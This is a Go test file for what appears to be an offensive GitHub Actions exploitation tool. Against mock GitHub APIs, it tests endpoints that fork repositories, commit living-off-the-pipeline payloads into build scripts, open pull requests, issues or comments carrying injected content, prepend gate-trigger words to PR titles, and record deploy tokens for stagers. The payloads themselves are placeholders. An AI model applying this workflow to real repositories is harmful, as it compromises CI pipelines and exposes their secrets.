func TestHandlerListReposWithInfo_Success(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(ghSrv.URL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })

	body := `{"token":"ghp_test"}`
	req := httptest.NewRequest(http.MethodPost, "/github/repos/info", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp ListReposWithInfoResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	require.Len(t, resp.Repos, 1)
	assert.Equal(t, "acme/api", resp.Repos[0].FullName)
	assert.True(t, resp.Repos[0].CanPush)
}

func swapGitHubClient(t *testing.T, ghSrvURL string) {
	t.Helper()
	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(ghSrvURL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token, graphqlURL: ghSrvURL + "/graphql"}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })
}

func TestHandlerDeployPR_Success(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"full_name":"%s/%s","default_branch":"main","owner":{"login":"%s"},"name":"%s"}`, owner, repo, owner, repo)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}/git/ref/{ref...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"ref":"refs/heads/main","object":{"sha":"abc123"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/git/refs", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"ref":"refs/heads/new","object":{"sha":"abc123"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("PUT /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"content":{"sha":"newsha"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/pulls", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/pull/1","number":1}`, owner, repo)
	})

	swapGitHubClient(t, ghSrv.URL)

	body := `{"token":"ghp_test","vuln":{"repository":"acme/api","workflow":"ci.yml","context":"pr_body"},"payload":"injected body"}`
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/pr", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp DeployPRResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Contains(t, resp.PRURL, "github.com/acme/api/pull")
}

func TestHandlerDeployPR_StoresStagerMetadata(t *testing.T) {
	h, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	require.NoError(t, h.stagerStore.Register(&RegisteredStager{ID: "stg1"}))

	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"full_name":"%s/%s","default_branch":"main","owner":{"login":"%s"},"name":"%s"}`, owner, repo, owner, repo)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}/git/ref/{ref...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"ref":"refs/heads/main","object":{"sha":"abc123"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/git/refs", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"ref":"refs/heads/new","object":{"sha":"abc123"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("PUT /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"content":{"sha":"newsha"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/pulls", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/pull/1","number":1}`, owner, repo)
	})

	swapGitHubClient(t, ghSrv.URL)

	body := `{"token":"ghp_test","stager_id":"stg1","vuln":{"repository":"acme/api","workflow":"ci.yml","context":"pr_body"},"payload":"injected body"}`
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/pr", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)

	stager := h.stagerStore.Get("stg1")
	require.NotNil(t, stager)
	assert.Equal(t, "https://github.com/acme/api/pull/1", stager.Metadata["pr_url"])
	assert.Empty(t, stager.Metadata["deploy_token"])
	assert.Equal(t, "ghp_test", stager.PrivateMetadata["deploy_token"])

	summary := callbackSummary(stager)
	assert.Empty(t, summary.Metadata["deploy_token"])
}

func TestHandlerDeployLOTP_Success(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"full_name":"%s/%s","default_branch":"main","owner":{"login":"%s"},"name":"%s"}`, owner, repo, owner, repo)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}/git/ref/{ref...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"ref":"refs/heads/main","object":{"sha":"abc123"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/git/refs", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"ref":"refs/heads/new","object":{"sha":"abc123"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("PUT /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"content":{"sha":"newsha"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `{"message":"Not Found"}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/pulls", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/pull/1","number":1}`, owner, repo)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/forks", func(w http.ResponseWriter, r *http.Request) {
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusAccepted)
		fmt.Fprintf(w, `{"owner":{"login":"testuser"},"name":"%s","full_name":"testuser/%s"}`, repo, repo)
	})

	swapGitHubClient(t, ghSrv.URL)

	h, _ := newGitHubTestHandler()
	_ = h

	body := `{"token":"ghp_test","repo_name":"acme/api","stager_id":"stg1","lotp_tool":"bash","lotp_targets":["scripts/build.sh"]}`
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/lotp", strings.NewReader(body))
	req.Host = "kitchen.example.com"
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp DeployLOTPResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Contains(t, resp.PRURL, "github.com/acme/api/pull")
}

func TestHandlerDeployLOTP_PrependsGatedPRTitle(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	var createdPR struct {
		Title string `json:"title"`
	}

	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"full_name":"%s/%s","default_branch":"main","owner":{"login":"%s"},"name":"%s"}`, owner, repo, owner, repo)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}/git/ref/{ref...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"ref":"refs/heads/main","object":{"sha":"abc123"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/git/refs", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"ref":"refs/heads/new","object":{"sha":"abc123"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("PUT /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"content":{"sha":"newsha"}}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("GET /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `{"message":"Not Found"}`)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/pulls", func(w http.ResponseWriter, r *http.Request) {
		require.NoError(t, json.NewDecoder(r.Body).Decode(&createdPR))
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/pull/2","number":2}`, owner, repo)
	})
	ghSrv.Config.Handler.(*http.ServeMux).HandleFunc("POST /repos/{owner}/{repo}/forks", func(w http.ResponseWriter, r *http.Request) {
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusAccepted)
		fmt.Fprintf(w, `{"owner":{"login":"testuser"},"name":"%s","full_name":"testuser/%s"}`, repo, repo)
	})

	swapGitHubClient(t, ghSrv.URL)

	body := `{"token":"ghp_test","repo_name":"acme/api","vuln":{"repository":"acme/api","workflow":".github/workflows/ci.yml","context":"untrusted_checkout","gate_triggers":["gravy"],"gate_raw":"contains(github.event.pull_request.title, 'gravy')"},"stager_id":"stg1","lotp_tool":"bash","lotp_targets":["scripts/build.sh"]}`
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/lotp", strings.NewReader(body))
	req.Host = "kitchen.example.com"
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	assert.Equal(t, "gravy chore: update build config", createdPR.Title)
}

func TestHandlerListWorkflows_Success(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(ghSrv.URL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })

	body := `{"token":"ghp_test","owner":"acme","repo":"api"}`
	req := httptest.NewRequest(http.MethodPost, "/github/workflows", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp ListWorkflowsResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Empty(t, resp.Workflows)
}

func TestHandlerDeployIssue_Success(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(ghSrv.URL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })

	body := `{"token":"ghp_test","vuln":{"repository":"acme/api","workflow":"ci.yml","context":"issue_body"},"payload":"injected"}`
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/issue", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp DeployIssueResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Contains(t, resp.IssueURL, "github.com/acme/api/issues")
}

func TestHandlerDeployComment_Success(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(ghSrv.URL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })

	body := `{"token":"ghp_test","vuln":{"repository":"acme/api","workflow":"ci.yml","context":"issue_comment","issue_number":5},"payload":"injected comment","target":"pull_request"}`
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/comment", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp DeployCommentResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Contains(t, resp.CommentURL, "acme/api/pull/5")
}

func TestHandlerGetUser_Success(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(ghSrv.URL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })

	body := `{"token":"ghp_test"}`
	req := httptest.NewRequest(http.MethodPost, "/github/user", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp GetUserResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Equal(t, "testuser", resp.Login)
	assert.Equal(t, []string{"repo", "workflow"}, resp.Scopes)
}

// =============================================================================
// closePRByURL / getPRBranch Tests (with mock GitHub API)
// =============================================================================

func TestClosePRByURL(t *testing.T) {
	var closedPR, deletedRef bool
	mux := http.NewServeMux()
	mux.HandleFunc("PATCH /repos/{owner}/{repo}/pulls/{number}", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, gitHubExploitUserAgent(), r.Header.Get("User-Agent"))
		closedPR = true
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"state":"closed","number":1}`)
	})
	mux.HandleFunc("GET /repos/{owner}/{repo}/pulls/{number}", func(w http.ResponseWriter, r *http.Request) {
		assert.NotContains(t, r.Header.Get("User-Agent"), gitHubExploitUserAgentID)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"number":1,"head":{"ref":"smokedmeat-lotp-12345"}}`)
	})
	mux.HandleFunc("DELETE /repos/{owner}/{repo}/git/refs/{ref...}", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, gitHubExploitUserAgent(), r.Header.Get("User-Agent"))
		deletedRef = true
		w.WriteHeader(http.StatusNoContent)
	})
	mux.HandleFunc("GET /user", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"login":"testuser"}`)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(srv.URL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })

	err := closePRByURL(context.Background(), "ghp_test", "https://github.com/acme/api/pull/1")
	assert.NoError(t, err)
	assert.True(t, closedPR)
	assert.True(t, deletedRef)
}

func TestClosePRByURL_InvalidURL(t *testing.T) {
	err := closePRByURL(context.Background(), "ghp_test", "https://github.com/acme/api/issues/1")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "not a PR URL")
}

func TestGetPRBranch(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	mux := http.NewServeMux()
	mux.HandleFunc("GET /repos/{owner}/{repo}/pulls/{number}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"number":42,"head":{"ref":"feature-branch"}}`)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	baseURL, _ := url.Parse(srv.URL + "/")
	ghClient.client.BaseURL = baseURL

	branch := getPRBranch(context.Background(), ghClient, "acme", "api", 42)
	assert.Equal(t, "feature-branch", branch)
}

func TestGetPRBranch_NotFound(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /repos/{owner}/{repo}/pulls/{number}", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `{"message":"Not Found"}`)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	baseURL, _ := url.Parse(srv.URL + "/")
	c := github.NewClient(nil)
	c.BaseURL = baseURL
	ghClient := &gitHubClient{client: c, token: "test"}

	branch := getPRBranch(context.Background(), ghClient, "acme", "api", 999)
	assert.Empty(t, branch)
}

// =============================================================================
// listWorkflowsWithDispatch with actual workflow content
// =============================================================================

func TestListWorkflowsWithDispatch_FiltersCorrectly(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /repos/{owner}/{repo}/actions/workflows", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"total_count":2,"workflows":[{"id":1,"name":"CI","path":".github/workflows/ci.yml"},{"id":2,"name":"Deploy","path":".github/workflows/deploy.yml"}]}`)
	})
	mux.HandleFunc("GET /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		filePath := r.PathValue("path")
		w.Header().Set("Content-Type", "application/json")
		var content string
		if strings.Contains(filePath, "ci.yml") {
			content = "on: [push]"
		} else {
			content = "on:\n  workflow_dispatch:\n    inputs: {}"
		}
		fmt.Fprintf(w, `{"content":"%s","encoding":"base64"}`, base64.StdEncoding.EncodeToString([]byte(content)))
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	baseURL, _ := url.Parse(srv.URL + "/")
	c := github.NewClient(nil)
	c.BaseURL = baseURL
	ghClient := &gitHubClient{client: c, token: "test"}

	workflows, err := ghClient.listWorkflowsWithDispatch(context.Background(), "acme", "api")
	require.NoError(t, err)
	assert.Equal(t, []string{".github/workflows/deploy.yml"}, workflows)
}

// =============================================================================
// Deployment Error Path Tests (Part 2)
// =============================================================================

func newMockGitHubAPIWithError(t *testing.T, failEndpoint string, statusCode int) *gitHubClient {
	t.Helper()

	mux := http.NewServeMux()

	mux.HandleFunc("GET /user", func(w http.ResponseWriter, r *http.Request) {
		if failEndpoint == "/user" {
			w.WriteHeader(statusCode)
			fmt.Fprint(w, `{"message":"error"}`)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"login":"testuser","id":1}`)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}", func(w http.ResponseWriter, r *http.Request) {
		if failEndpoint == "/repos/get" {
			w.WriteHeader(statusCode)
			fmt.Fprint(w, `{"message":"error"}`)
			return
		}
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		if failEndpoint == "/forks" && owner == "testuser" {
			w.WriteHeader(http.StatusNotFound)
			fmt.Fprint(w, `{"message":"Not Found"}`)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"full_name":"%s/%s","default_branch":"main","owner":{"login":"%s"},"name":"%s","permissions":{"push":true}}`, owner, repo, owner, repo)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}/git/ref/{ref...}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"ref":"refs/heads/main","object":{"sha":"abc123def456","type":"commit"}}`)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/git/refs", func(w http.ResponseWriter, r *http.Request) {
		if failEndpoint == "/git/refs" {
			w.WriteHeader(statusCode)
			fmt.Fprint(w, `{"message":"error"}`)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"ref":"refs/heads/new-branch","object":{"sha":"abc123def456"}}`)
	})

	mux.HandleFunc("PUT /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		if failEndpoint == "/contents" {
			w.WriteHeader(statusCode)
			fmt.Fprint(w, `{"message":"error"}`)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"content":{"sha":"newsha123"}}`)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}/contents/{path...}", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `{"message":"Not Found"}`)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/pulls", func(w http.ResponseWriter, r *http.Request) {
		if failEndpoint == "/pulls" {
			w.WriteHeader(statusCode)
			fmt.Fprint(w, `{"message":"error"}`)
			return
		}
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/pull/1","number":1}`, owner, repo)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/forks", func(w http.ResponseWriter, r *http.Request) {
		if failEndpoint == "/forks" {
			w.WriteHeader(statusCode)
			fmt.Fprintf(w, `{"message":"error","status":"%d"}`, statusCode)
			return
		}
		forkRepo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusAccepted)
		fmt.Fprintf(w, `{"owner":{"login":"testuser"},"name":"%s","full_name":"testuser/%s","default_branch":"main"}`, forkRepo, forkRepo)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		if failEndpoint == "/issues" {
			w.WriteHeader(statusCode)
			fmt.Fprint(w, `{"message":"error"}`)
			return
		}
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/issues/1","number":1}`, owner, repo)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		if failEndpoint == "/issues/list" {
			w.WriteHeader(statusCode)
			fmt.Fprint(w, `{"message":"error"}`)
			return
		}
		if failEndpoint == "/issues/only_prs" {
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprint(w, `[{"number":10,"pull_request":{"url":"https://api.github.com/repos/acme/api/pulls/10"}}]`)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `[]`)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues/{number}/comments", func(w http.ResponseWriter, r *http.Request) {
		if failEndpoint == "/comments" {
			w.WriteHeader(statusCode)
			fmt.Fprint(w, `{"message":"error"}`)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"id":1}`)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	baseURL, _ := url.Parse(srv.URL + "/")
	tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: "test-token"}))
	client := github.NewClient(tc)
	client.BaseURL = baseURL

	return &gitHubClient{client: client, token: "test-token"}
}

// --- deployVulnerability error paths ---

func TestDeployVulnerability_GetUserFails(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/user", http.StatusInternalServerError)

	vuln := &VulnerabilityInfo{Repository: "acme/api", Workflow: "ci.yml", Context: "pr_body"}
	_, err := ghClient.deployVulnerability(context.Background(), vuln, "payload", true)

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to get authenticated user")
}

func TestDeployVulnerability_ForkFails(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/forks", http.StatusForbidden)

	vuln := &VulnerabilityInfo{Repository: "acme/api", Workflow: "ci.yml", Context: "pr_body"}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_, err := ghClient.deployVulnerability(ctx, vuln, "payload", true)

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to fork repository")
}

func TestDeployVulnerability_CreateBranchFails(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/git/refs", http.StatusUnprocessableEntity)

	vuln := &VulnerabilityInfo{Repository: "acme/api", Workflow: "ci.yml", Context: "pr_body"}
	_, err := ghClient.deployVulnerability(context.Background(), vuln, "payload", true)

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to create branch")
}

func TestDeployVulnerability_CreatePRFails(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/pulls", http.StatusUnprocessableEntity)

	vuln := &VulnerabilityInfo{Repository: "acme/api", Workflow: "ci.yml", Context: "pr_body"}
	_, err := ghClient.deployVulnerability(context.Background(), vuln, "payload", true)

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to create pull request")
}

// --- deployLOTP error paths ---

func TestDeployLOTP_GetUserFails(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/user", http.StatusInternalServerError)

	_, err := ghClient.deployLOTP(context.Background(), nil, "acme/api", "http://kitchen.test", "stg1", "bash", []string{"scripts/build.sh"}, true)

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to get authenticated user")
}

func TestDeployLOTP_ForkFails(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/forks", http.StatusForbidden)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_, err := ghClient.deployLOTP(ctx, nil, "acme/api", "http://kitchen.test", "stg1", "bash", []string{"scripts/build.sh"}, true)

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to fork repository")
}

func TestDeployLOTP_CommitFails(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/contents", http.StatusInternalServerError)

	_, err := ghClient.deployLOTP(context.Background(), nil, "acme/api", "http://kitchen.test", "stg1", "bash", []string{"scripts/build.sh"}, true)

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to commit")
}

func TestDeployLOTP_CreatePRFails(t *testing.T) {
	ghClient := newMockGitHubAPIWithError(t, "/pulls", http.StatusUnprocessableEntity)

	_, err := ghClient.deployLOTP(context.Background(), nil, "acme/api", "http://kitchen.test", "stg1", "bash", []string{"scripts/build.sh"}, true)

	assert.Error(t, err)
	assert.Contains(t, err.Error(), "failed to create pull request")
}

// --- deployComment error paths ---

func TestDeployComment_ListIssuesFails(t *testing.T) {
